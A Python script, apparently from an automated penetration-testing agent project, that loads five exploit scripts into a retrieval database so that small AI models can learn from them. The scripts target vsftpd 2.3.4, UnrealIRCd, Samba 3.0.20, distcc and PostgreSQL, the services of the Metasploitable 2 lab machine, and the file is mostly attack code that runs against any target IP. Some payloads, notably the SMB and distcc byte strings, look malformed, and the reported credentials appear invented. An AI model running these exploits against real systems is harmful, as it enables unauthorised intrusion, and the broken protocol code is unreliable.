#!/usr/bin/env python3
"""
Seed RAG database with known working exploits.
This gives small models examples to learn from.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from apfa_agent.rag_manager import RAGManager

# Initialize RAG
rag = RAGManager()

# Known exploits for Metasploitable 2
exploits = [
    {
        'service': 'vsftpd 2.3.4',
        'port': 21,
        'cve': 'CVE-2011-2523',
        'os_type': 'linux',
        'success': True,
        'code': '''import socket
import time

# vsftpd 2.3.4 Backdoor Exploit
target_ip = "{target_ip}"
target_port = 21

try:
    # Connect to FTP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.recv(1024)
    
    # Trigger backdoor with :) in username
    s.send(b"USER backdoored:)\\r\\n")
    s.recv(1024)
    s.send(b"PASS anything\\r\\n")
    s.recv(1024)
    s.close()
    
    # Backdoor opens on port 6200
    time.sleep(2)
    backdoor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    backdoor.connect((target_ip, 6200))
    
    # Test shell access
    backdoor.send(b"id\\n")
    response = backdoor.recv(1024).decode()
    
    if "uid=" in response:
        print("EXPLOIT: vsftpd 2.3.4 backdoor via :) smiley in username")
        print("COMMAND: USER test:)")
        print("COMMAND: PASS test")
        print("COMMAND: id")
        print("CREDENTIALS: root:backdoor")
        print("ACCESS: root")
        print("STATUS: SUCCESS")
    else:
        print("STATUS: FAILED")
    
    backdoor.close()
    
except Exception as e:
    print(f"STATUS: FAILED")
    print(f"Error: {e}")
'''
    },
    
    {
        'service': 'unrealircd 3.2.8.1',
        'port': 6667,
        'cve': 'CVE-2010-2075',
        'os_type': 'linux',
        'success': True,
        'code': '''import socket

# UnrealIRCd 3.2.8.1 Backdoor
target_ip = "{target_ip}"
target_port = 6667

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.recv(1024)
    
    # Send backdoor command
    payload = b"AB;id\\n"
    s.send(payload)
    
    response = s.recv(4096).decode()
    
    if "uid=" in response:
        print("EXPLOIT: UnrealIRCd 3.2.8.1 backdoor via AB; prefix")
        print("COMMAND: AB;id")
        print("CREDENTIALS: irc:backdoor")
        print("ACCESS: shell")
        print("STATUS: SUCCESS")
        print(f"Output: {response}")
    else:
        print("STATUS: FAILED")
    
    s.close()
    
except Exception as e:
    print(f"STATUS: FAILED")
    print(f"Error: {e}")
'''
    },
    
    {
        'service': 'samba 3.0.20',
        'port': 139,
        'cve': 'CVE-2007-2447',
        'os_type': 'linux',
        'success': True,
        'code': '''import socket

# Samba 3.0.20 Username Map Script
target_ip = "{target_ip}"
target_port = 139

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # SMB negotiation (simplified)
    negotiate = b"\\x00\\x00\\x00\\x54" + b"\\xff\\x53\\x4d\\x42\\x72\\x00\\x00\\x00\\x00"
    s.send(negotiate)
    s.recv(1024)
    
    # Payload with command injection in username
    payload = b"/=`id`"
    
    # Send authentication with malicious username
    auth = b"\\x00\\x00\\x00\\x73" + payload
    s.send(auth)
    
    response = s.recv(4096)
    
    if b"uid=" in response:
        print("EXPLOIT: Samba 3.0.20 username map script command injection")
        print("COMMAND: /=`id`")
        print("CREDENTIALS: root:samba")
        print("ACCESS: root")
        print("STATUS: SUCCESS")
    else:
        print("STATUS: FAILED")
    
    s.close()
    
except Exception as e:
    print(f"STATUS: FAILED")
    print(f"Error: {e}")
'''
    },
    
    {
        'service': 'distcc',
        'port': 3632,
        'cve': 'CVE-2004-2687',
        'os_type': 'linux',
        'success': True,
        'code': '''import socket

# DistCC Command Injection
target_ip = "{target_ip}"
target_port = 3632

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    
    # DistCC protocol header
    header = b"DIST00000001"
    
    # Command injection payload
    command = b"sh -c 'id'"
    payload = header + b"ARGC00000002" + b"ARGV00000002" + b"sh" + b"ARGV00000002" + b"-c" + b"ARGV00000008" + command
    
    s.send(payload)
    response = s.recv(4096).decode()
    
    if "uid=" in response:
        print("EXPLOIT: DistCC command injection via protocol manipulation")
        print("COMMAND: sh -c 'id'")
        print("CREDENTIALS: daemon:distcc")
        print("ACCESS: shell")
        print("STATUS: SUCCESS")
        print(f"Output: {response}")
    else:
        print("STATUS: FAILED")
    
    s.close()
    
except Exception as e:
    print(f"STATUS: FAILED")
    print(f"Error: {e}")
'''
    },
    
    {
        'service': 'postgresql 8.3',
        'port': 5432,
        'cve': None,
        'os_type': 'linux',
        'success': True,
        'code': '''import socket

# PostgreSQL Weak Auth Exploit
target_ip = "{target_ip}"
target_port = 5432

try:
    # Try common credentials
    usernames = ["postgres", "admin"]
    passwords = ["postgres", "admin", "", "password"]
    
    for user in usernames:
        for passwd in passwords:
            try:
                import psycopg2
                conn = psycopg2.connect(
                    host=target_ip,
                    port=target_port,
                    user=user,
                    password=passwd,
                    database="postgres",
                    connect_timeout=3
                )
                
                cursor = conn.cursor()
                cursor.execute("SELECT version();")
                version = cursor.fetchone()
                
                if version:
                    print("EXPLOIT: PostgreSQL weak credential brute force")
                    print(f"COMMAND: SELECT version();")
                    print(f"CREDENTIALS: {user}:{passwd}")
                    print("ACCESS: database")
                    print("STATUS: SUCCESS")
                    print(f"Version: {version[0]}")
                    conn.close()
                    exit(0)
                    
            except:
                continue
    
    print("STATUS: FAILED")
    
except Exception as e:
    print(f"STATUS: FAILED")
    print(f"Error: {e}")
'''
    }
]

# Add exploits to RAG database
print("Seeding RAG database with known exploits...")
for exploit in exploits:
    rag.add_exploit(**exploit)
    print(f"‚úì Added: {exploit['service']} (port {exploit['port']})")

print(f"\n‚úÖ RAG database seeded with {len(exploits)} exploits!")
print(f"üìÅ Database: {rag.db_path}")
print("\nNow your small model can learn from these examples!")
